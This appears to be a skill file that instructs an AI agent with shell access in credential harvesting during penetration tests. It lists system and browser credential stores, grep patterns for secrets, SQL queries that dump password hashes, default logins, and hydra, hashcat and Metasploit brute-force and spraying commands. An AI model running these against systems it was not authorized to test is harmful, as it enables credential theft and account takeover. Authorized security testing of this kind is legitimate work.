---
name: credential-harvesting
description: Comprehensive credential discovery, extraction, management, and reuse testing across multiple services and formats
allowed-tools: Bash, Read, Write, Grep
---

# Credential Harvesting Skill

## Purpose
Provides systematic approaches for discovering, extracting, managing, and testing credentials across various sources, formats, and services during penetration testing engagements.

## Credential Discovery Locations

### Linux Systems
Search these locations for credentials:

```bash
# Configuration Files
/etc/shadow (if readable)
/etc/passwd
/etc/security/opasswd
~/.ssh/id_rsa, id_dsa, id_ecdsa, id_ed25519
~/.ssh/authorized_keys
~/.ssh/known_hosts
~/.ssh/config

# Web Application Configs
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/config/database.yml
/opt/*/config/*
/etc/nginx/sites-enabled/*
/etc/apache2/sites-enabled/*

# Database Configs
~/.my.cnf
/etc/mysql/debian.cnf
/var/lib/mysql/mysql/user.MYD

# History Files
~/.bash_history
~/.mysql_history
~/.python_history
~/.nano_history
~/.psql_history

# Environment Variables
/proc/*/environ
/etc/environment
/etc/profile
```

### Windows Systems
```powershell
# SAM and SYSTEM
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM

# Credential Manager
cmdkey /list
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\

# Browser Passwords
C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data
C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\logins.json

# Configuration Files
C:\inetpub\wwwroot\web.config
C:\Program Files\*\*.config
C:\ProgramData\*\*.xml
```

## Credential Formats

### Hash Types Recognition
```bash
# Execute hash identifier
scripts/hash-identifier.py "{hash_string}"

# Common formats:
# MD5: 32 hex characters
# SHA1: 40 hex characters
# SHA256: 64 hex characters
# SHA512: 128 hex characters
# NTLM: 32 hex characters
# Linux Shadow: $1$ (MD5), $2$ (Blowfish), $5$ (SHA256), $6$ (SHA512)
# BCrypt: $2a$, $2b$, $2y$
```

### Password Extraction Patterns
```bash
# Common patterns in config files
password = ".*"
password: .*
'password' => '.*'
"password": ".*"
PWD=.*
PASS=.*
```

## Credential Management

### Storage and Organization
```bash
# Store discovered credentials
scripts/credential-manager.sh store "{username}" "{password}" "{hash}" "{service}" "{source}"

# Retrieve credentials
scripts/credential-manager.sh get --service ssh
scripts/credential-manager.sh get --username admin
scripts/credential-manager.sh list

# Export for reporting
scripts/credential-manager.sh export --format json > credentials.json
```

### Credential Database Schema
```json
{
  "credential_id": "uuid",
  "username": "string",
  "password": "string|null",
  "hash": "string|null",
  "hash_type": "string|null",
  "service": "string",
  "target": "ip_address",
  "source": "where_found",
  "tested": "boolean",
  "working": "boolean",
  "timestamp": "iso_datetime"
}
```

## Password Testing Strategies

### Service-Specific Testing Order
1. **SSH** - Highest impact, direct shell access
2. **RDP** - Windows system access
3. **SMB** - File share and potential RCE
4. **FTP** - File system access
5. **MySQL/PostgreSQL** - Database access
6. **HTTP** - Admin panel access
7. **VNC** - Desktop access

### Credential Reuse Testing
```bash
# Test single credential across all services
scripts/credential-manager.sh test-all "{username}" "{password}" "{target}"

# Test all discovered credentials
scripts/credential-manager.sh spray --target "{ip}" --services "ssh,ftp,smb"
```

### Default Credentials

#### Common Service Defaults
```
# Web Applications
admin:admin
admin:password
admin:123456
root:root
root:toor
guest:guest
test:test

# Databases
root:(blank)
root:root
sa:sa
postgres:postgres

# Network Devices
admin:admin
admin:(blank)
cisco:cisco
admin:cisco

# Tomcat
tomcat:tomcat
admin:tomcat
tomcat:s3cret

# Jenkins
admin:password
jenkins:jenkins
```

## SSH Key Management

### SSH Key Discovery
```bash
# Find all SSH keys
find / -name id_rsa -o -name id_dsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null

# Check key permissions
ls -la ~/.ssh/

# Test discovered keys
ssh -i {key_file} {user}@{target}
```

### SSH Key Extraction
```bash
# Proper key formatting
scripts/credential-manager.sh format-key "{raw_key_data}" > formatted_key
chmod 600 formatted_key

# Extract public key from private
ssh-keygen -y -f {private_key} > {public_key}
```

## Hash Cracking

### Online Cracking
```bash
# Check common online databases
scripts/hash-lookup.sh "{hash}"
# Checks: crackstation, hashkiller, hashes.org
```

### Offline Cracking Preparation
```bash
# Format for hashcat
scripts/password-formatter.sh hashcat "{hash_file}" "{hash_type}"

# Format for John
scripts/password-formatter.sh john "{hash_file}" "{format}"

# Common hashcat examples
hashcat -m 0 {md5_hash} {wordlist}      # MD5
hashcat -m 1000 {ntlm_hash} {wordlist}  # NTLM
hashcat -m 1800 {shadow} {wordlist}     # Linux shadow
hashcat -m 3200 {bcrypt} {wordlist}     # BCrypt
```

## Database Credential Extraction

### MySQL
```sql
-- Get user credentials
SELECT user, authentication_string FROM mysql.user;
SELECT user, password FROM mysql.user; -- older versions

-- Check privileges
SELECT * FROM information_schema.user_privileges;
```

### PostgreSQL
```sql
-- Get user hashes
SELECT usename, passwd FROM pg_shadow;

-- List users and roles
\du
```

### MSSQL
```sql
-- Get password hashes
SELECT name, password_hash FROM sys.sql_logins;

-- Check server roles
SELECT * FROM sys.server_role_members;
```

## Web Application Credentials

### Common Locations
```bash
# Environment files
.env
.env.local
.env.production

# Framework configs
config/database.php     # Laravel
config/database.yml     # Rails
settings.py            # Django
wp-config.php          # WordPress
configuration.php      # Joomla
settings.php           # Drupal
```

### Extraction Patterns
```bash
# WordPress
grep "DB_PASSWORD" wp-config.php

# Laravel
grep "DB_PASSWORD" .env

# Generic patterns
grep -r "password\|passwd\|pwd\|pass" . 2>/dev/null
grep -r "api_key\|apikey\|api-key" . 2>/dev/null
grep -r "secret\|token" . 2>/dev/null
```

## Credential Testing Automation

### Hydra Integration
```bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://{target}

# FTP testing
hydra -l admin -P passwords.txt ftp://{target}

# HTTP POST form
hydra -l admin -P passwords.txt {target} http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

### Metasploit Integration
```bash
# SMB testing
use auxiliary/scanner/smb/smb_login
set RHOSTS {target}
set USER_FILE users.txt
set PASS_FILE passwords.txt
```

## Best Practices

1. **Always Store Findings**: Record every credential discovered
2. **Test Systematically**: Use discovered creds across all services
3. **Check Reuse**: Same passwords often used across services
4. **Note Sources**: Document where each credential was found
5. **Respect Scope**: Only test authorized systems
6. **Clean Up**: Remove test accounts after engagement

## Integration with Session Management

```bash
# Store credentials in session
SESSION_ID=$(scripts/session-manager.sh current)
scripts/state-persistence.sh record "$SESSION_ID" "credentials" "{username}" "{password_hash}"

# Retrieve for testing
CREDS=$(scripts/state-persistence.sh get "$SESSION_ID" "*" "credentials")
```

## Reporting Format

Generate credential report:
```bash
scripts/credential-manager.sh report --format markdown

# Output format:
# ## Discovered Credentials
#
# | Username | Password | Hash | Service | Source | Working |
# |----------|----------|------|---------|--------|---------|
# | admin | admin123 | - | SSH | config.php | Yes |
# | root | - | $6$... | System | /etc/shadow | No |
```

## Security Notes

- Never store client production credentials
- Use encrypted storage for credential databases
- Clear credential data after engagement
- Follow responsible disclosure for default credentials